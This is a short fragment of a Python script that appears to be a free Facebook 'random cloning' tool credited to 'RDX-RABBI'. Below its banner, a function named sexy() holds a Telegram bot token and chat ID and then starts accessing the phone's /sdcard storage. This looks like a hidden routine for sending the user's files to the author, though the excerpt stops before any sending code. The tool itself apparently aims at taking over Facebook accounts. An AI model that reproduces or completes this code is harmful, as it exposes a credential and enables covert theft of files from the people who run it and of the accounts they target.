...
╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚══════╝" {G1}[{A}V{G1}/{A}2.6{G1}]
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} RDX-RABBI
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} RABBI\_____:*\❷/3:)\⓿
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} SCRIPT FREE
{A}──────────────────────────────────────────────────"""
...
def sexy():
    ...
    bot_token = '7091539143:AAFWfwSohS4S3bGa3d3W9bb-XCvLFQfstkk' 
    chat_id = '6309194984'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
